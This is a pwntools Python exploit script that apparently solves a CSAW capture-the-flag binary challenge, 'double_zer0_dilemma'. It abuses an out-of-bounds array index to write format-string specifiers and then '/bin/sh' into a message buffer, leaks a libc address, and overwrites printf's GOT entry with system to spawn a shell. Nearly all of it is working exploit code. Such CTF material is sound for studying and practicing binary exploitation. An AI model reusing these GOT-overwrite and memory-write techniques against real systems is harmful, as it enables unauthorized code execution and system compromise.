#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './double_zer0_dilemma'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = 'double-zer0.csaw.io', 9999

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x808a34a
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def genWritePayload(what, existing=0):
    # what = (existing + payload) // 2
    # what * 2 - existing = payload
    return (what * 2 - existing)

def send(payload, idx):
    io.sendlineafter(b'land on:', str(idx).encode())
    io.sendlineafter(b'wager:', str(payload).encode())

def leakLibc():
    global io
    io = initialize()
    
    # "%p" = 0x7025
    #  RUN sysctl kernel.randomize_va_space=0
    payload = genWritePayload(0x7025702570257025, 0x746f742072756f59)
    idx = (elf.sym['exit_msg'] - elf.sym['bets']) // 8
    
    # leaked -> 0x7ffff7fbd723 -> _IO_2_1_stdout_+131
    send(payload ,idx)
    send(1, 1)
    
    io.interactive()
    
def exploit():
    global io
    io = initialize()

    # existing exit_msg -> 0x746f742072756f59
    # /bin/sh           -> 0x0068732f6e69622f
    payload = genWritePayload(0x0068732f6e69622f, 0x746f742072756f59)
    idx = (elf.sym['exit_msg'] - elf.sym['bets']) // 8
    send(payload, idx)
    
    # overwrite printf with system
    libc.address = (0x7ffff7fbd723 - 131) - libc.sym['_IO_2_1_stdout_']
    payload = genWritePayload(libc.sym['system'], 0x401040)
    idx = (elf.got['printf'] - elf.sym['bets']) // 8
    send(payload, idx)

    io.interactive()
    
if __name__ == '__main__':
    # leakLibc()
    exploit()
